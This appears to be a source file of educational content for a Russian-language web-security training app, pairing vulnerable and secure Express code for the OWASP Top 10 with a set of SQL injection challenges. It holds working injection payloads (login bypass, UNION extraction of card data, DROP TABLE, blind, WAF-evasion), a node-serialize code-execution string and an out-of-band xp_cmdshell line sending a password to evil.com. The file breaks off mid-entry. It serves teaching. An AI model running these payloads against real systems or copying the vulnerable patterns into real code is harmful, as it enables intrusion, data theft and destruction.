// ============================================================
// OWASP Top 10 (2021) — Educational Content in Russian
// ============================================================
export const owaspItems = [
  {
    id: 'a01',
    code: 'A01:2021',
    title: 'Сбой контроля доступа (Broken Access Control)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'Сбои контроля доступа являются наиболее критической уязвимостью в веб-приложениях. Они возникают, когда пользователи могут получать доступ к данным или функциям, которые не должны быть им доступны. Это включает обход аутентификации, повышение привилегий, просмотр чужих данных и несанкционированное выполнение операций.',
    realExample:
      'В 2019 году исследователи обнаружили, что в популярном банковском приложении можно было изменить номер аккаунта в URL-адресе запроса и получить доступ к счетам других клиентов. Это позволило злоумышленникам просматривать балансы и совершать переводы от имени других пользователей, что привело к многомиллионным убыткам.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — отсутствие проверки прав доступа
app.get('/api/users/:id', (req, res) => {
  // Любой пользователь может запросить данные любого другого пользователя
  const user = db.findUser(req.params.id);
  res.json(user);
});

// УЯЗВИМЫЙ КОД — манипуляция ID в запросе
app.get('/api/orders/:orderId', (req, res) => {
  const order = db.findOrder(req.params.orderId);
  // Нет проверки, что заказ принадлежит текущему пользователю
  res.json(order);
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — проверка прав доступа
app.get('/api/users/:id', (req, res) => {
  // Проверяем, что пользователь запрашивает только свои данные
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Доступ запрещён' });
  }
  const user = db.findUser(req.params.id);
  res.json(user);
});

// БЕЗОПАСНЫЙ КОД — использование токена авторизации
app.get('/api/orders/:orderId', (req, res) => {
  const order = db.findOrder(req.params.orderId);
  if (order.userId !== req.user.id) {
    return res.status(403).json({ error: 'Заказ не найден' });
  }
  res.json(order);
});`,
    mitigations: [
      'Реализуйте контроль доступа на серверной стороне (никогда не полагайтесь на клиент)',
      'Используйте принцип наименьших привилегий для всех ролей',
      'Запретите доступ к файлам по умолчанию (deny by default)',
      'Внедрите логирование и мониторинг несанкционированных попыток доступа',
      'Используйте идентификаторы сессии вместо прямых ID объектов',
    ],
  },
  {
    id: 'a02',
    code: 'A02:2021',
    title: 'Криптографические сбои (Cryptographic Failures)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'Криптографические сбои возникают при неправильном использовании криптографии — слабое шифрование, отсутствие шифрования важных данных, использование устаревших алгоритмов или неправильное управление ключами. Ранее эта категория называлась «Раскрытие конфиденциальных данных» и затрагивает не только криптографию, но и общие проблемы с защитой данных.',
    realExample:
      'Один из крупнейших утечек данных произошёл в 2017 году, когда компания Equifax потеряла данные 147 миллионов человек. Причиной стало использование устаревшей версии Apache Struts с известной уязвимостью. Данные (номера карт, SSN) хранились в открытом виде без должной криптографической защиты, что усугубило последствия.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — хранение паролей в открытом виде
const user = {
  email: 'user@example.com',
  password: 'mypassword123',  // Хранится в plain text!
  creditCard: '4532-1234-5678-9012' // Нет шифрования
};

// УЯЗВИМЫЙ КОД — использование слабого хеширования
const crypto = require('crypto');
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
  // MD5 — устаревший и ненадёжный алгоритм
}`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — использование bcrypt
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

async function hashPassword(password) {
  const salt = await bcrypt.genSalt(SALT_ROUNDS);
  return bcrypt.hash(password, salt);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

// БЕЗОПАСНОЕ хранение данных
const user = {
  email: 'user@example.com',
  passwordHash: '$2b$12$LJ3m4...hash',
  creditCard: encryptData(cardNumber, ENCRYPTION_KEY)
};`,
    mitigations: [
      'Используйте bcrypt или Argon2 для хеширования паролей',
      'Применяйте AES-256 для шифрования данных в покое',
      'Используйте TLS 1.3 для передачи данных',
      'Не храните пароли в открытом виде — только хеши',
      'Классифицируйте данные по уровню конфиденциальности',
    ],
  },
  {
    id: 'a03',
    code: 'A03:2021',
    title: 'Инъекции (Injection)',
    severity: 'Критический',
    severityColor: 'bg-red-500',
    description:
      'Инъекции — это класс уязвимостей, при которых недоверенные данные отправляются интерпретатору в составе команды или запроса. Наиболее распространённые виды: SQL-инъекции, NoSQL-инъекции, OS-инъекции, LDAP-инъекции. Злоумышленник может выполнить нежелательные команды или получить доступ к данным без соответствующих прав.',
    realExample:
      'В 2008 году атака SQL-инъекцией на корпоративную сеть Heartland Payment Systems позволила злоумышленникам украсть данные 130 миллионов кредитных карт. Атакующие использовали SQL-инъекцию в веб-форме для выполнения произвольных SQL-запросов к базе данных компании. Этот случай стал одним из самых масштабных краж финансовых данных.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — прямая подстановка в SQL
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const query = \`SELECT * FROM users
    WHERE username = '\${username}'
    AND password = '\${password}'\`;
  // Ввод: ' OR '1'='1' --
  // Итог: SELECT * FROM users WHERE username='' OR '1'='1' --
  db.query(query, (err, results) => {
    if (results.length > 0) res.json({ success: true });
  });
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — параметризованные запросы
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const query = 'SELECT * FROM users WHERE username = ? AND password_hash = ?';
  // Параметры передаются отдельно — невозможна инъекция
  db.query(query, [username, passwordHash], (err, results) => {
    if (results.length > 0) res.json({ success: true });
  });
});

// Или с ORM (Prisma, Sequelize)
const user = await prisma.user.findUnique({
  where: { username }
});`,
    mitigations: [
      'Используйте параметризованные запросы или ORM',
      'Применяйте валидацию и санитизацию входных данных',
      'Используйте принцип наименьших привилегий для БД',
      'Внедрите WAF (Web Application Firewall)',
      'Тестируйте с помощью автоматизированных инструментов (SQLMap)',
    ],
  },
  {
    id: 'a04',
    code: 'A04:2021',
    title: 'Небезопасный дизайн (Insecure Design)',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Небезопасный дизайн — это широкая категория уязвимостей, связанная с недостатками в архитектуре и проектировании приложения. В отличие от Implementation bugs, эти проблемы заложены на этапе проектирования и не могут быть решены простой модификацией кода. Примеры: отсутствие ограничений на частоту запросов, слабые бизнес-правила валидации, отсутствие управления состоянием.',
    realExample:
      'Многие системы онлайн-бронирования позволяют злоумышленникам бронировать товары без оплаты, блокируя их для реальных покупателей. Это происходит потому, что при проектировании не было предусмотрено ограничение по времени незавершённых бронирований и не была реализована система предварительной авторизации средств.',
    vulnerableCode: `// НЕБЕЗОПАСНЫЙ ДИЗАЙН — нет ограничений
app.post('/api/forgot-password', (req, res) => {
  // Нет лимита на количество запросов — можно перебрать коды
  // Нет верификации email перед сменой пароля
  sendResetCode(req.body.email);
  res.json({ message: 'Код отправлен' });
});

// Нет ограничения на количество попыток ввода OTP
app.post('/api/verify-otp', (req, res) => {
  if (req.body.code === storedCode) {
    resetPassword(req.body.email);
  }
});`,
    secureCode: `// БЕЗОПАСНЫЙ ДИЗАЙН — rate limiting + бизнес-логика
const rateLimit = require('express-rate-limit');

const otpLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 минут
  max: 5, // максимум 5 попыток
  message: 'Слишком много попыток. Попробуйте позже.'
});

app.post('/api/verify-otp', otpLimiter, (req, res) => {
  // Проверяем, что код не просрочен (10 минут)
  if (Date.now() - otpCreatedAt > 10 * 60 * 1000) {
    return res.status(400).json({ error: 'Код просрочен' });
  }
  // Верифицируем код
  if (req.body.code === storedCode) {
    resetPassword(req.body.email);
  }
});`,
    mitigations: [
      'Проводите анализ угроз на этапе проектирования (Threat Modeling)',
      'Внедряйте ограничение частоты запросов (Rate Limiting)',
      'Проектируйте безопасные бизнес-процессы с учётом злоупотреблений',
      'Используйтеstoryboarding и abuse cases',
      'Применяйте защищённые паттерны проектирования',
    ],
  },
  {
    id: 'a05',
    code: 'A05:2021',
    title: 'Ошибки безопасности (Security Misconfiguration)',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Ошибки безопасности — это наиболее распространённая категория уязвимостей, вызванная некорректной конфигурацией приложений, серверов, фреймворков и библиотек. Это может включать включённые отладочные режимы в продакшене, открытые облачные хранилища, неиспользуемые функции по умолчанию, незащищённые заголовки HTTP и многое другое.',
    realExample:
      'В 2017 году исследователи обнаружили, что Defence.gc.ca — официальный сайт Министерства национальной обороны Канады — оставил открытым сервер Elasticsearch без пароля. Это позволило любому пользователю получить доступ к базам данных с конфиденциальной информацией, включая внутренние документы и учётные записи.',
    vulnerableCode: `// НЕБЕЗОПАСНАЯ КОНФИГУРАЦИЯ
const app = express();

// Заголовки безопасности отсутствуют
app.use(express.static('public'));
// Нет CORS
// Нет Helmet
// Отладка включена в продакшене
app.set('env', 'development');

// Развернутые на продакшене отладочные эндпоинты
app.get('/debug/routes', (req, res) => {
  res.json(app._router.stack); // Показывает все маршруты
});

app.get('/debug/env', (req, res) => {
  res.json(process.env); // Показывает переменные окружения!
});`,
    secureCode: `// БЕЗОПАСНАЯ КОНФИГУРАЦИЯ
const app = express();
const helmet = require('helmet');

// Защитные заголовки HTTP
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: { defaultSrc: ["'self'"] }
}));

// Настройка CORS
const cors = require('cors');
app.use(cors({ origin: 'https://myapp.com' }));

// Отключение лишних заголовков
app.disable('x-powered-by');

// В продакшене — никакой отладки
if (process.env.NODE_ENV === 'production') {
  app.set('env', 'production');
  // Отладочные эндпоинты ТОЛЬКО в разработке
}`,
    mitigations: [
      'Используйте helmet.js для настройки заголовков безопасности',
      'Отключите отладку и ненужные эндпоинты в продакшене',
      'Применяйте минимальную конфигурацию (отключайте всё лишнее)',
      'Автоматизируйте проверку конфигурации через CI/CD',
      'Регулярно проводите аудит конфигурации серверов',
    ],
  },
  {
    id: 'a06',
    code: 'A06:2021',
    title: 'Уязвимые и устаревшие компоненты (Vulnerable Components)',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Использование библиотек, фреймворков и других программных компонентов с известными уязвимостями — одна из самых распространённых проблем безопасности. Злоумышленники могут автоматически сканировать приложения на наличие известных уязвимых версий и эксплуатировать их с минимальными усилиями. Каждое приложение использует множество компонентов, и любой из них может быть уязвим.',
    realExample:
      'Уязвимость Log4Shell (CVE-2021-44228) в библиотеке Apache Log4j затронула миллионы приложений по всему миру. Уязвимость позволяла злоумышленникам выполнять произвольный код на сервере, отправляя специально сформированную строку в лог. Многие организации даже не знали, что используют Log4j, так как он был транзитивной зависимостью в их приложениях.',
    vulnerableCode: `// УЯЗВИМЫЕ ЗАВИСИМОСТИ в package.json
{
  "dependencies": {
    "lodash": "4.17.4",        // Уязвимость CVE-2021-23337
    "express": "4.16.0",       // Обнаружены уязвимости
    "jquery": "2.2.4",         // XSS уязвимости
    "minimist": "0.0.8"       // Prototype pollution
  }
}

// Без блокировки версий:
// "lodash": "^4.17.0" — может установить уязвимую версию
`,
    secureCode: `// БЕЗОПАСНОЕ управление зависимостями

// 1. Используйте точные или ranged версии с aware-интервалом
{
  "dependencies": {
    "lodash": "4.17.21",      // Последняя безопасная версия
    "express": "4.19.2",      // Актуальная версия
  }
}

// 2. Регулярный аудит через npm/bun
// bun audit
// npm audit --production

// 3. Используйте Snyk или Dependabot для мониторинга
// 4. Блокировка версий через lock-файлы (bun.lock)
// 5. Проверяйте лицензии зависимостей
`,
    mitigations: [
      'Регулярно обновляйте зависимости (минимум раз в месяц)',
      'Используйте `bun audit` или `npm audit` для проверки',
      'Настройте Dependabot или Snyk для автоматического мониторинга',
      'Удаляйте неиспользуемые зависимости',
      'Подпишитесь на Security Advisories используемых пакетов',
    ],
  },
  {
    id: 'a07',
    code: 'A07:2021',
    title: 'Ошибки идентификации и аутентификации',
    severity: 'Высокий',
    severityColor: 'bg-orange-500',
    description:
      'Ошибки идентификации и аутентификации возникают, когда функции подтверждения личности пользователя реализованы некорректно. Это позволяет злоумышленникам выдавать себя за других пользователей, обходить аутентификацию или использовать слабые механизмы проверки. Проблемы включают: permitByDefault, слабые пароли, отсутствие MFA, уязвимые механизмы восстановления пароля.',
    realExample:
      'В 2020 году исследователи обнаружили, что система входа крупного провайдера облачных услуг позволяла перебирать пароли без ограничений. Злоумышленники могли сделать до 100 попыток в минуту, что при наличии слабых паролей пользователей приводило к успешной компрометации аккаунтов. Для миллионов аккаунтов использовались пароли из топ-10000 самых популярных.',
    vulnerableCode: `// УЯЗВИМЫЙ МЕХАНИЗМ АУТЕНТИФИКАЦИИ
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.findUser(email);
  // Нет ограничения на количество попыток!
  if (user && user.password === password) { // Plain text сравнение!
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Неверные данные' });
  }
});

// Слабая функция восстановления пароля
app.post('/reset-password', (req, res) => {
  // 4-значный PIN — легко перебрать
  if (req.body.pin === storedPin) {
    resetPassword(req.body.email);
  }
});`,
    secureCode: `// БЕЗОПАСНАЯ АУТЕНТИФИКАЦИЯ
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Слишком много попыток входа'
});

app.post('/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  const user = await db.findUser(email);

  // Используем bcrypt для сравнения (с постоянным временем)
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    // Генерируем токен с TTL
    const token = jwt.sign(
      { id: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
    res.json({ token });
  } else {
    // Одинаковое сообщение для обоих случаев
    res.status(401).json({ error: 'Неверные учётные данные' });
  }
});`,
    mitigations: [
      'Реализуйте многофакторную аутентификацию (MFA)',
      'Используйте bcrypt/Argon2 для хранения паролей',
      'Внедрите ограничение попыток входа (Rate Limiting)',
      'Не раскрывайте информацию о существовании аккаунтов',
      'Используйте стандартные библиотеки аутентификации (NextAuth, Passport)',
    ],
  },
  {
    id: 'a08',
    code: 'A08:2021',
    title: 'Ошибки целостности и сериализации данных',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Ошибки целостности данных связаны с ненадёжной десериализацией данных из ненадёжных источников. Это может привести к выполнению произвольного кода, подмене объектов или манипуляции логикой приложения. В новых архитектурах эта категория также включает CSRF, в котором десериализация может изменить данные на сервере от имени другого пользователя.',
    realExample:
      'В 2015 году уязвимость в библиотеке Apache Commons Collections позволяла злоумышленникам выполнить произвольный код через десериализацию Java-объектов. Эта уязвимость затронула множество приложений, включая WebLogic, WebSphere, JBoss и другие серверы приложений. Впоследствии аналогичные уязвимости были найдены в .NET (Json.NET) и Node.js (node-serialize).',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — прямая десериализация
const deserialize = require('node-serialize');

app.post('/api/data', (req, res) => {
  // Данные от пользователя десериализуются напрямую
  // Злоумышленник может внедрить IIFE: _$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()
  const data = deserialize.unserialize(req.body.data);
  res.json({ result: processData(data) });
});

// УЯЗВИМЫЙ КОД — eval() на пользовательских данных
app.post('/api/calculate', (req, res) => {
  // Никогда не делайте так!
  const result = eval(req.body.expression);
  res.json({ result });
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — Schema validation
const { z } = require('zod');

const DataSchema = z.object({
  name: z.string().max(100),
  age: z.number().int().positive().max(150),
  email: z.string().email(),
});

app.post('/api/data', (req, res) => {
  // Валидация через схему — безопасная десериализация
  const result = DataSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error });
  }
  res.json({ result: processData(result.data) });
});

// Для вычислений — используйте безопасные библиотеки
const math = require('mathjs');
const result = math.evaluate(sanitizedExpression);`,
    mitigations: [
      'Никогда не десериализуйте данные от ненадёжных источников напрямую',
      'Используйте JSON.parse() вместо кастомных десериализаторов',
      'Внедряйте валидацию схем (Zod, Joi, Yup)',
      'Используйте integrity checks (цифровые подписи)',
      'Избегайте eval() и аналогичных функций с пользовательским вводом',
    ],
  },
  {
    id: 'a09',
    code: 'A09:2021',
    title: 'Ошибки журналирования и мониторинга',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'Без надлежащего журналирования и мониторинга нарушения безопасности остаются незамеченными длительное время. Большинство успешных атак можно было предотвратить или минимизировать при наличии эффективной системы мониторинга и логирования. К сожалению, журналирование часто является послесловием при разработке и не получает должного внимания.',
    realExample:
      'Атака на Equifax в 2017 году оставалась незамеченной более 76 дней, несмотря на то, что инструменты мониторинга безопасности компании должны были обнаружить её. После инцидента выяснилось, что сертификат для одного из инструментов мониторинга SSL истёк 10 месяцами ранее. Если бы журналирование работало корректно, утечка данных 147 миллионов человек могла бы быть предотвращена.',
    vulnerableCode: `// НЕДОСТАТОЧНОЕ ЖУРНАЛИРОВАНИЕ
app.post('/login', (req, res) => {
  const user = authenticate(req.body);
  if (user) {
    // Нет записи об успешном входе
    res.json({ token: user.token });
  } else {
    // Нет записи о неуспешной попытке
    // Нет IP-адреса, User-Agent, timestamp
    res.status(401).json({ error: 'Ошибка' });
  }
});

// Логи без контекста
console.log('Login failed'); // Кем? Когда? Откуда?
console.error(err);          // Без stack trace
`,
    secureCode: `// БЕЗОПАСНОЕ ЖУРНАЛИРОВАНИЕ
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
  ]
});

app.post('/login', (req, res) => {
  const ip = req.ip;
  const userAgent = req.get('user-agent');
  const user = authenticate(req.body);

  if (user) {
    logger.info('LOGIN_SUCCESS', {
      userId: user.id,
      ip,
      userAgent,
      timestamp: new Date().toISOString()
    });
    res.json({ token: user.token });
  } else {
    logger.warn('LOGIN_FAILURE', {
      email: req.body.email,
      ip,
      userAgent,
      timestamp: new Date().toISOString()
    });
    res.status(401).json({ error: 'Ошибка' });
  }
});`,
    mitigations: [
      'Логируйте все события аутентификации (успешные и неуспешные)',
      'Записывайте IP-адреса, User-Agent и временные метки',
      'Настройте автоматические алерты на подозрительную активность',
      'Используйте централизованную систему логирования (ELK, Splunk)',
      'Не логируйте конфиденциальные данные (пароли, токены, номера карт)',
    ],
  },
  {
    id: 'a10',
    code: 'A10:2021',
    title: 'Подделка запросов на стороне сервера (SSRF)',
    severity: 'Средний',
    severityColor: 'bg-yellow-500',
    description:
      'SSRF-уязвимости возникают, когда серверное приложение делает HTTP-запросы к указанному пользователем URL без должной проверки. Злоумышленник может заставить сервер запрашивать внутренние ресурсы, облачные метаданные или внутренние API, к которым у него нет прямого доступа. Это особенно опасно в облачных средах, где метаданные экземпляров содержат учётные данные.',
    realExample:
      'В 2019 году исследователи обнаружили SSRF-уязвимость в Capital One, которая позволила злоумышленнице получить доступ к метаданным AWS EC2-инстанса через запрос к внутреннему IP-адресу 169.254.169.254. Это позволило ей получить временные IAM-учётные данные и получить доступ к базам данных S3 с персональными данными 106 миллионов клиентов Capital One.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — SSRF
app.get('/api/fetch-url', async (req, res) => {
  const { url } = req.query;
  // Сервер делает запрос к любому URL без проверки
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
  // Атака: /api/fetch-url?url=http://169.254.169.254/latest/meta-data/
  // Возвращает метаданные AWS с учётными данными!
});

// УЯЗВИМЫЙ КОД — загрузка изображений
app.post('/api/proxy-image', async (req, res) => {
  // Нет валидации URL — можно запросить внутренние ресурсы
  const image = await fetch(req.body.imageUrl);
  const buffer = await image.buffer();
  res.set('Content-Type', 'image/png');
  res.send(buffer);
});`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — валидация URL
const { URL } = require('url');

const ALLOWED_DOMAINS = ['images.example.com', 'cdn.example.com'];
const BLOCKED_HOSTS = ['169.254.169.254', 'localhost', '127.0.0.1'];

app.get('/api/fetch-url', async (req, res) => {
  try {
    const parsedUrl = new URL(req.query.url);

    // Проверяем протокол
    if (!['https:'].includes(parsedUrl.protocol)) {
      return res.status(400).json({ error: 'Только HTTPS разрешён' });
    }

    // Проверяем домен
    if (!ALLOWED_DOMAINS.includes(parsedUrl.hostname)) {
      return res.status(400).json({ error: 'Домен не разрешён' });
    }

    // Проверяем на заблокированные хосты
    if (BLOCKED_HOSTS.includes(parsedUrl.hostname)) {
      return res.status(403).json({ error: 'Доступ запрещён' });
    }

    const response = await fetch(parsedUrl.href);
    res.send(await response.text());
  } catch {
    res.status(400).json({ error: 'Некорректный URL' });
  }
});`,
    mitigations: [
      'Используйте белый список разрешённых доменов',
      'Запретите запросы к внутренним IP-адресам и localhost',
      'Используйте только HTTPS для исходящих запросов',
      'Настройте network policies для ограничения исходящего трафика',
      'Внедрите проверку URL на этапе разбора (до выполнения запроса)',
    ],
  },
];

// ============================================================
// SQL Injection Challenges
// ============================================================
export const sqlChallenges = [
  {
    id: 'beginner-1',
    level: 'Новичок',
    title: 'Обход аутентификации',
    description: 'Войдите в систему без знания реального пароля, используя SQL-инъекцию в форме логина.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'password123'`,
    hint: 'Попробуйте закрыть строку с помощью одинарной кавычки и добавить условие, которое всегда истинно.',
    exampleInput: "' OR '1'='1",
    explanation:
      'Ввод \\\' OR \\\'1\\\'=\\\'1 закрывает строку username и добавляет условие OR \\\'1\\\'=\\\'1\\\', которое всегда истинно. Это превращает запрос в: SELECT * FROM users WHERE username=\\\'\\\' OR \\\'1\\\'=\\\'1\\\' AND password=\\\'password123\\\'. Благодаря приоритету оператора AND, условие OR \\\'1\\\'=\\\'1\\\' оценивается первым, возвращая все строки.',
    successQuery: `SELECT * FROM users\nWHERE username = '' OR '1'='1'\n  AND password = 'password123'`,
  },
  {
    id: 'beginner-2',
    level: 'Новичок',
    title: 'Комментарий для обхода',
    description: 'Обойдите проверку пароля, используя SQL-комментарий для игнорирования оставшейся части запроса.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'any'`,
    hint: 'Используйте символы -- (двойной дефис) для комментирования части запроса с паролем.',
    exampleInput: "admin'--",
    explanation:
      'Ввод admin\\\'-- закрывает строку username, а -- превращает всё после в комментарий. Запрос становится: SELECT * FROM users WHERE username=\\\'admin\\\'-- AND password=\\\'any\\\'. Часть с паролем полностью игнорируется, и запрос возвращает данные пользователя admin.',
    successQuery: `SELECT * FROM users\nWHERE username = 'admin'--\n  AND password = 'any'`,
  },
  {
    id: 'advanced-1',
    level: 'Продвинутый',
    title: 'Извлечение данных через UNION',
    description: 'Используйте UNION SELECT для извлечения данных из таблицы credit_cards.',
    initialQuery: `SELECT name, email FROM users\nWHERE name LIKE '%[ВВОД]%'`,
    hint: 'Закройте LIKE-выражение и добавьте UNION SELECT для выборки из другой таблицы. Количество столбцов должно совпадать.',
    exampleInput: "' UNION SELECT card_number, cvv FROM credit_cards--",
    explanation:
      'UNION объединяет результаты двух SELECT-запросов. Количество столбцов должно быть одинаковым. Комментарий -- скрывает остаток оригинального запроса. Результат: SELECT name, email FROM users WHERE name LIKE \\\'\\\' UNION SELECT card_number, cvv FROM credit_cards--%. Это возвращает данные о кредитных картах вместе с обычными результатами.',
    successQuery: `SELECT name, email FROM users\nWHERE name LIKE '%' UNION SELECT card_number, cvv FROM credit_cards--%'`,
  },
  {
    id: 'expert-1',
    level: 'Эксперт',
    title: 'Уничтожение данных (DROP TABLE)',
    description: 'Используйте инъекцию для выполнения деструктивной операции — удалите таблицу.',
    initialQuery: `SELECT * FROM products\nWHERE id = [ВВОД]`,
    hint: 'Закройте числовое значение и добавьте точку с запятой для нового SQL-оператора.',
    exampleInput: "1; DROP TABLE products;--",
    explanation:
      'Точка с запятой позволяет выполнить несколько SQL-операторов в одном запросе. Ввод 1; DROP TABLE products;-- сначала выполняет SELECT, а затем DROP TABLE. Этот тип атаки особенно опасен, так как приводит к полной потере данных. Многие СУБД предотвращают множественные запросы, но не все.',
    successQuery: `SELECT * FROM products\nWHERE id = 1; DROP TABLE products;--`,
  },
  {
    id: 'beginner-3',
    level: 'Новичок',
    title: 'Error-based SQLi',
    description: 'Извлеките информацию о версии базы данных через сообщения об ошибках.',
    initialQuery: `SELECT * FROM users\nWHERE id = '[ВВОД]'`,
    hint: 'Попробуйте передать значение, которое вызовет ошибку преобразования типов, раскрывающую версию СУБД.',
    exampleInput: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    explanation:
      'Error-based SQLi использует сообщения об ошибках СУБД для извлечения информации. Когда сервер возвращает ошибку с деталями запроса, злоумышленник может получить версию БД, имена таблиц и столбцов. GROUP BY с CONCAT и RAND вызывает дублирование ключей, что генерирует ошибку, содержащую нужные данные.',
    successQuery: `SELECT * FROM users\nWHERE id = '' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
  },
  {
    id: 'beginner-4',
    level: 'Новичок',
    title: 'Boolean-based Blind SQLi',
    description: 'Определите, существует ли пользователь "admin", используя только ответы true/false от сервера.',
    initialQuery: `SELECT * FROM products\nWHERE name LIKE '%[ВВОД]%'`,
    hint: 'Используйте условие, которое возвращает разные результаты для true и false. SUBSTRING() поможет посимвольно извлечь данные.',
    exampleInput: "' AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'--",
    explanation:
      'Blind SQLi не возвращает данные напрямую, но позволяет делать логические выводы. Если страница отображается нормально — условие истинно. Если контент изменён или отсутствует — ложно. Перебирая символы через SUBSTRING(), можно восстановить пароль посимвольно.',
    successQuery: `SELECT * FROM products\nWHERE name LIKE '%' AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'--`,
  },
  {
    id: 'advanced-2',
    level: 'Продвинутый',
    title: 'Time-based Blind SQLi',
    description: 'Используйте задержки (SLEEP) для определения уязвимости, когда сервер не возвращает видимых различий.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
    hint: 'Функция SLEEP(n) заставляет СУБД ждать n секунд. Используйте условную задержку: IF(condition, SLEEP(5), 0).',
    exampleInput: "' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--",
    explanation:
      'Time-based SQLi — самый сложный тип blind-инъекций. Сервер всегда возвращает одинаковый ответ, но время ответа зависит от условия. Если задержка 3+ секунды — условие истинно. Это позволяет извлекать данные посимвольно, измеряя время ответа.',
    successQuery: `SELECT * FROM users\nWHERE username = '' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--`,
  },
  {
    id: 'advanced-3',
    level: 'Продвинутый',
    title: 'Second-order SQLi',
    description: 'Внедрите SQL-инъекцию через регистрацию нового пользователя, которая сработает при изменении профиля.',
    initialQuery: `-- Сначала данные сохраняются:\nINSERT INTO users (username, email)\nVALUES ('[ВВОД]', 'user@test.com')\n\n-- Потом используются без санитизации:\nSELECT * FROM users\nWHERE username = 'сохранённое_значение'`,
    hint: 'При регистрации введите username, который при последующем использовании выполнит вредоносный SQL. Попробуйте: admin\\\'--',
    exampleInput: "admin'--",
    explanation:
      'Second-order SQLi происходит в два этапа: 1) Вредоносный payload сохраняется в БД через看似 безобидный ввод. 2) При последующем использовании этих данных (например, при поиске по username) payload активируется. Многие разработчики санитизируют ввод, но забывают о выходе данных.',
    successQuery: `-- Сохранение:\nINSERT INTO users (username, email)\nVALUES ('admin'--', 'user@test.com')\n\n-- Использование (часть запроса закомментирована):\nSELECT * FROM users\nWHERE username = 'admin'--'`,
  },
  {
    id: 'expert-2',
    level: 'Эксперт',
    title: 'Out-of-band SQLi (OOB)',
    description: 'Извлеките данные через внешний DNS-запрос, когда прямой ответ сервера недоступен.',
    initialQuery: `SELECT * FROM users\nWHERE id = [ВВОД]`,
    hint: 'Функция xp_cmdshell (MSSQL) или LOAD_FILE (MySQL) может инициировать DNS-запрос к контролируемому вами домену.',
    exampleInput: "1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--",
    explanation:
      'Out-of-band SQLi используется, когда нельзя получить данные через HTTP-ответ. Злоумышленник заставляет сервер сделать DNS-запрос или HTTP-запрос к внешнему серверу, внедряя данные в доменное имя. Например, password123.evil.com в логах DNS показывает извлечённый пароль.',
    successQuery: `SELECT * FROM users\nWHERE id = 1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--`,
  },
  {
    id: 'expert-3',
    level: 'Эксперт',
    title: 'WAF Bypass — обход фильтрации',
    description: 'Обойдите Web Application Firewall, используя кодирование и обфускацию SQL-запроса.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
    hint: 'WAF блокирует ключевые слова SELECT, UNION. Попробуйте: HEX-кодирование строк, CONCAT для обхода фильтра ключевых слов, комментарии /**/ для разбивки.',
    exampleInput: "'/*!50000UnIoN*//*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--",
    explanation:
      'WAF использует сигнатурный анализ для блокировки SQL-инъекций. Обход возможен через: 1) Регистр: UnIoN SeLeCt. 2) Комментарии: /*!50000UNION*/ выполняется только в MySQL 5.0+. 3) HEX-кодирование: 0x61646d696e вместо \'admin\'. 4) CHAR(): CHAR(97,100,109,105,110) = \'admin\'. 5) URL-encoding: %27 вместо кавычки.',
    successQuery: `SELECT * FROM users\nWHERE username = ''/*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--`,
  },
  {
    id: 'expert-4',
    level: 'Эксперт',
    title: 'Polyglot SQLi — универсальный пейлоад',
